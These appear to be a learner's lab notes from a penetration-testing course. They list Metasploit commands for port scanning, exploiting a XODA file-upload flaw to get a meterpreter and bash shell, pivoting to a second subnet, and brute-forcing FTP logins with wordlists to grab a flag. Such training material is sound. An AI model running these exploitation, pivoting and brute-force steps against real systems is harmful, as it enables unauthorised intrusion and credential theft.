# Nmap 

## Port Scanning & Enumeration with Nmap

## Demo: Port Scanning & Enumeration with Nmap

Export Scan in xml format:

`nmap -Pn -sV -O [target IP] -oX windows_server_2012`

`cat windows_server_2012`

## Importing Nmap Scan Results into MSF

## Demo

`ls`

`service postgresql start`

`msfconsole`

`db_status`

we are connected

`workspace`

creating new workspace:

`workspace -a Win2k12`

`db_import /root/windows_server_2012` (Tab autocompletion to see the files)

We check if it imported successfully:

`hosts`

Showing services for the winsrv2012 target:

`services`

We initiate a nmap scan from within the msfconsole:

`workspace`

`workspace -a Nmap_MSF`

`workspace`

`db_nmap -Pn -sV -O [target IP]`

`hosts`

`services`

`vulns`

# Enumeration

## Port Scanning with Auxiliary Modules

- Auxiliary modules are used to perform functionality like scanning, discovery and fuzzing.
- We can use auxiliary modules to perform both TCP & UDP port scanning as well as enumerating information form services like FTP, SSH, HTTP etc
- Auxiliary modules can be used during the information gathering phase of a pentest as well as the post exploitation phase.
- We can also use auxiliary modules to discover hosts and perform port scanning on a different network subnet after we have obtained initial access on a target system.

## Lab Infrastructure

- Our objective is to utilize auxiliary modules to discover open ports on our first target.
- The next step will involve exploiting the service running on the target in order to obtain a foothold.
- We will then utilize our foothold to access other systems on a different network subnet (pivoting).
- We will then utilize auxiliary modules to scan for open ports on the second target.
![grafik](https://github.com/user-attachments/assets/9ab0ccac-9823-40da-8442-11f81a0e82b1)

## Demo: Port Scanning with Auxiliary Modules

Obtaining the target IP adress.

`ifconfig`

eth1, replacing 2 with 3

`service postgresql start`

`msfconsole`

msf6:`db_status`

msf6:`workspace -a Port_Scan`

We want to search the portscanner auxiliary module (we start with tcp)

`search portscan`

msf6:`auxiliary/scanner/portscan/tcp`

msf6:`ifconfig`

msf6:`show options`

msf6:`set rhosts [target IP]`

msf6:`run`

We download the Homepage (HTML Code):

msf6:`curl [target IP]`

msf6:`search xoda`

msf6:`use exploit/unix/webapp/xoda_file_upload`

`show options`

msf6:`set rhosts [target IP]`

We need to specify the path of the webApp:

msf6:`set targeturi /`

msf6:`set lhost [ownIP]`

msf6:`show options`

msf6:`exploit`

meterpreter:`sysinfo`

meterpreter:`shell`

`/bin/bash -i`

shell:`ifconfig`

eth1 is in the target 2 subnet (our system (target1) is eth1, for target2 change 2 to 3)

clear out

We add the route (We will be able to perform the scan):

meterpreter:`run autoroute -s [eth1]`

meterpreter:`background`

msf6 xoda exploit:`search portscan`

msf6 xoda exploit:`use portscan`

msf6 xoda exploit:`set rhosts [target2 IP]`

msf6 xoda exploit:`show options`

msf6 xoda exploit:`run`

Now we could start exploiting and pivoting the second target.

Using the UDP module:

msf6:`search udp_sweep`

msf6:`use auxiliary/scanner/discovery/udp_sweep`

msf6:`show options`

msf6:`ifconfig`

msf6:`set rhosts [targetIP]`

## FTP Enumeration

- FTP is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client / clients.
- It is also used as a means of trandferring files to and from the directory of a web server.
- We can use multiple auxiliary modules to enumerate information as well as perform brute-force attacks on targets running an FTP server.
- FTP authenticaton utilizes a username and password combination, however, in some cases an improperly configured FTP server can be logged into anonymously.

## Demo: FTP Enumeration

`service postgresql start`

`ifconfig`

`msfconsole`

msf6:`workspace -a FTP_Enum`

We use a auxiliary module to check the version of FTP. First we check the open ports using a portscan module:

msf6:`use auxiliary/scanner/portscan/tcp`

msf6:`show options`

msf6:`set rhosts [targetIP]`

msf6:`run`

We can't see the service version, so how mentioned earlier:

`back`

msf6:`search ftp`

msf6:`search type:auxiliary name:ftp`

msf6:`use auxiliary/scanner/ftp/ftp_version`

msf6:`show options`

msf6:`set rhosts [targetIP]`

msf6:`run`

We get the service version and the banner.

we can search for example for proftpd.

### FTP Brute Force auxiliary module

msf6:`search type:auxiliary name:ftp`

msf6:`use auxiliary/scanner/ftp/ftp_login`

msf6:`set rhosts [target IP]`

msf6:`show options`

The options show us, that we need to provide RHOST, USER_FILE/USERNAME, PASS_FILE. Because we don't have a password nor a username, we provide a user_file and a password_file. We use metasploit files

msf6:`set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`

msf6:`set PASSWORD_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt`

Start Brute-Force:

msf6:`run`

msf6:`ftp [targetIP]`

The brute-force causes a ddos. so we try another module while we wait for the restart:

we try to login anonymously:

msf6:`search type:auxiliary name: auxiliary`

msf6:`use auxiliary/scanner/ftp/anonymous`

msf6:`show options`

msf6:`set rhosts [target IP]`

msf6:`run`

We can see, that anonymous login is not possible in our case. So we try to login with our obtained credentials. But first we exit metasploit:

msf6:`exit`

`ftp [targetIP]`

*We login with our credentials*

`ls`

`get secret.txt`

`exit`

`ls`

`cat secret.txt`

We obtained the flag.


















